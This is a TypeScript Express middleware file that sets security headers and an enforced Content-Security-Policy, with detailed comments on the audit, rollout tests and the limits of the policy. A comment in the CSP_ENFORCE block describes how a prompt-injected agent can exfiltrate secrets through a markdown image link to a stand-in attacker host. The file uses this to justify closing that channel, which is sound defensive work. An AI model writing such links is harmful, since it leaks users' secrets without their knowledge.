/**
 * App-wide security response headers.
 *
 * Added 2026-09-02, after an audit of the file-serving paths found the app sending
 * **none** — verified against live prod, not the source: no `X-Content-Type-Options`,
 * no CSP, no `X-Frame-Options`.
 *
 * ## The split, and why it is not timidity
 *
 * A Content-Security-Policy that breaks the dashboard is worse than no CSP, because the
 * first thing anyone does with a broken app is delete the header — and then the parts
 * that were never risky go with it. So the directives divide by what they can break:
 *
 * **Enforced now** — cannot break this app, and each closes a real attack:
 *   - `frame-ancestors 'self'` + `X-Frame-Options: SAMEORIGIN` — clickjacking. Both,
 *     because X-Frame-Options is what older browsers honour and frame-ancestors is what
 *     modern ones do.
 *   - `object-src 'none'` — no `<object>`/`<embed>`; the app has none.
 *   - `base-uri 'self'` — a `<base>` tag injected into the page cannot re-point every
 *     relative URL at an attacker.
 *   - `form-action 'self'` — an injected form cannot post the user's input elsewhere.
 *
 * **Was Report-Only, now enforced** — the script/style/img/connect half, which
 * genuinely might have broken things. The dashboard is not simple: two inline `<script>` blocks in index.html (a
 * pre-paint theme resolver and GA config), Google Fonts, Google Analytics, React inline
 * styles on nearly every element, live browser frames as `data:` URIs, a Socket.IO
 * websocket, and three in-browser runners that pull Pyodide, sql.js and the TypeScript
 * compiler from CDNs and execute code in a sandboxed srcdoc iframe.
 *
 * It shipped Report-Only first and was flipped only after two live browser runs — see
 * `CSP_ENFORCE` below for exactly what they covered.
 *
 * ## What this CSP will and will not buy, stated plainly
 *
 * `script-src` has to allow `'unsafe-inline'` (those two inline blocks) and
 * `'unsafe-eval'` (the runners). With both, **this CSP is not meaningful XSS
 * protection** — it restricts which *origins* scripts may come from, which is worth
 * something and is not the same thing. The real XSS defences here remain the ones in
 * `file-serving.ts` and not serving attacker HTML from this origin.
 *
 * Removing `'unsafe-inline'` is a real option and is not free: the two inline scripts
 * would need hashes computed from the built `index.html` at startup, and Google
 * Analytics would have to survive it. That is its own change with its own testing.
 */

import type { Request, Response, NextFunction } from 'express';

/**
 * ENFORCING since 2026-09-02.
 *
 * ## The evidence, and what it does and does not cover
 *
 * Two live runs, both with a real headless Chromium (`spikes/csp_harness.py` and
 * `spikes/csp_enforce_harness.py`):
 *
 * 1. The real app at `nanocrew.example.com` under this policy: **zero violations**, page
 *    rendered, `data-theme` set — proving the inline `<script>` in index.html ran
 *    rather than being silently skipped. That was the LOGGED-OUT page.
 *
 * 2. Everything behind the login is what the first run could not reach, and verifying
 *    it properly would have meant forging a session with prod's COOKIE_SECRET — a
 *    bigger intrusion than the question warrants. So the second run inverts it: a page
 *    served under this EXACT policy, enforcing, performing every operation the unproven
 *    directives exist for. **10/10, zero violations**: inline script, inline style,
 *    `eval`, `new Function`, `img-src data:`, `img-src blob:`, a `ws://` connection to
 *    the origin, a sandboxed `srcdoc` iframe running script, and real script loads from
 *    both CDNs.
 *
 * That proves the policy permits every operation the app performs. It does not prove
 * the authenticated app performs only those. The external-host inventory was taken from
 * source and is complete: the only other origin referenced is `example.com`, and it is
 * a plain `<a href>`, which CSP does not restrict.
 *
 * ## The one deliberate behaviour change
 *
 * `img-src` has no `https:`, so an ABSOLUTE image URL in agent-authored markdown no
 * longer renders. `MarkdownViewer` passes absolute srcs straight through, so an agent
 * could previously write `![](https://any-host/x.png)` and the dashboard would fetch it.
 *
 * That is a loss and also a fix. It is the standard exfiltration channel against an AI
 * chat UI: a prompt-injected agent writes `![](https://attacker/?d=<secrets>)` and the
 * browser fetches it automatically, with no click and nothing on screen to notice.
 * react-markdown escapes HTML, so the image vector is the realistic one here — which
 * makes closing it worth more than the convenience.
 *
 * To restore the old behaviour, add `https:` to `img-src` below. One line, and it
 * reopens that channel; do it knowingly.
 */
const CSP_ENFORCE = true;

/** Directives that cannot break this app. Always enforced. */
const ENFORCED_DIRECTIVES = [
  "frame-ancestors 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');

/**
 * The full policy, including the parts that might break something.
 *
 * Every entry below is here because something in the app actually needs it — see the
 * inventory in the module docstring. Nothing is speculative; if a host here stops being
 * used, it should be removed.
 */
const FULL_DIRECTIVES = [
  "default-src 'self'",
  // 'unsafe-inline': index.html's theme resolver and GA config.
  // 'unsafe-eval': Pyodide and the TypeScript compiler in the in-browser runners.
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://www.googletagmanager.com",
  // React writes inline style attributes on nearly every element.
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' data: https://fonts.gstatic.com",
  // data: is the live browser frames (data:image/jpeg); blob: is generated downloads.
  "img-src 'self' data: blob: https://www.google-analytics.com https://www.googletagmanager.com",
  // ws/wss is Socket.IO to our own origin; the CDNs are the runners fetching wasm.
  "connect-src 'self' ws: wss: https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://www.google-analytics.com https://*.google-analytics.com https://www.googletagmanager.com",
  "worker-src 'self' blob:",
  // JsRunner executes user code in a sandboxed srcdoc iframe.
  "frame-src 'self' blob: data:",
  "media-src 'self' blob: data:",
  ...ENFORCED_DIRECTIVES.split('; '),
].join('; ');

export function securityHeaders(
  _req: Request,
  res: Response,
  next: NextFunction,
): void {
  // Without this a browser may disregard the Content-Type a route carefully chose and
  // guess from the bytes instead, which makes every decision in file-serving.ts
  // advisory. Applied everywhere, not just to file routes.
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Belt and braces with frame-ancestors below: this is what older browsers honour.
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  // Leaks less of the app's internal paths to third parties on outbound navigation.
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  if (CSP_ENFORCE) {
    res.setHeader('Content-Security-Policy', FULL_DIRECTIVES);
  } else {
    res.setHeader('Content-Security-Policy', ENFORCED_DIRECTIVES);
    res.setHeader('Content-Security-Policy-Report-Only', FULL_DIRECTIVES);
  }

  next();
}

/** Exported for tests and for the verification harness that reads violations. */
export const _policies = { ENFORCED_DIRECTIVES, FULL_DIRECTIVES, CSP_ENFORCE };
